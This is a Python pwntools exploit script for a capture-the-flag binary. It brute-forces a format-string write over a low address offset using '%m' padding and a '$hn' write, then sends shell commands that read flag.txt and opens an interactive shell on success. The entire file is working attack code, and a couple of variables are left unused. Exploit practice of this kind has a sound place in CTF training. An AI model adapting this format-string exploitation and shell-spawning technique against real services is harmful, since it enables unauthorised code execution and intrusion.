from pwn import *
import sys
import re
import time

HOST = "127.0.0.1"
PORT = 5000

exe = context.binary = ELF('./chall_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def start():
    if len(sys.argv) > 1 and sys.argv[1] == 'r':
        return remote(HOST, PORT)
    return exe.process()

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            brva 0x123F
            brva 0x1364
            brva 0x139A
            c
            set follow-fork-mode parent
        ''')

def low16_candidates():
    return [page_low - 0x10 for page_low in range(0x1000, 0x10000, 0x1000)]

def build_payload(index, low16):
    payload = f'%{low16}m%{index}$hn'.encode()
    if len(payload) > 16:
        log.failure(f'payload too long: {payload}')
        exit()
    return payload.ljust(16, b'\x00')

MARKER = b'__PWNED__'
indices = [36]
lows = low16_candidates()

CMD = (
    b'echo __PWNED__; '
    b'cat flag.txt 2>/dev/null || cat /opt/chal/flag.txt 2>/dev/null\n'
)

system = libc.sym.system
fini_array_offset = 0x3d88

for i in range(1, 128 + 1):
    index = indices[(i - 1) % len(indices)]
    low16 = lows[((i - 1) // len(indices)) % len(lows)]

    log.info(f'attempt {i}/128: index={index}, low16={hex(low16)}')

    p = start()

    try:
        payload = build_payload(index, low16)
        p.sendafter(b'message: ', payload)
        time.sleep(0.05)
        p.send(CMD)

        data = p.recvrepeat(timeout=1)
        if MARKER in data:
            log.success(f'hit: index={index}, low16={hex(low16)}')
            print(data.decode(errors='ignore'))

            p.interactive()
            exit()

        p.close()

    except EOFError:
        try:
            p.close()
        except:
            pass

    except Exception as e:
        log.warning(str(e))
        try:
            p.close()
        except:
            pass

log.failure('exploit failed')